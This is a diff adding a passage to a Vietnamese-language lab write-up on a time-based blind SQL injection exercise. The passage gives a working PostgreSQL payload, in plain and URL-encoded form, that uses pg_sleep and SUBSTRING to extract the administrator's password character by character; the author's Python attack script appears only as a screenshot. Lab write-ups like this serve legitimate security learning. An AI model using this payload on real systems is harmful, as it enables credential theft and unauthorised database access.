@@ -293,14 +293,18 @@ Không biết do đề như thế hay có lỗi gì nhưng khi tôi để sleep 
 
 ![image](https://github.com/user-attachments/assets/f91b8cb6-3478-40cc-8a0f-2feb87ecba63)
 
+Do mạng lag quá nên tôi phải đợi mạng ổn ổn chút mới dám làm tiếp, vì lag nên không test được payload, tôi viết 1 đoạn code python để tấn công sql mù:
 
+![image](https://github.com/user-attachments/assets/b1d6cc54-b211-450e-b332-5a93fa84cc0b)
 
+Do mấy bài trước chỉ có chữ thường và số nên bài này tôi cũng chữ thường và số mà chiến thôi, payload thì đây `';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users -- -` và đây là sau khi encode url `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+--+-`
 
+![image](https://github.com/user-attachments/assets/553deaeb-754f-457e-87ca-11a4ce5ab2f8)
 
+Xong
 
-
-
-
+<h1>---------------------------------------------------------</h1>
+<br>
 
 
 
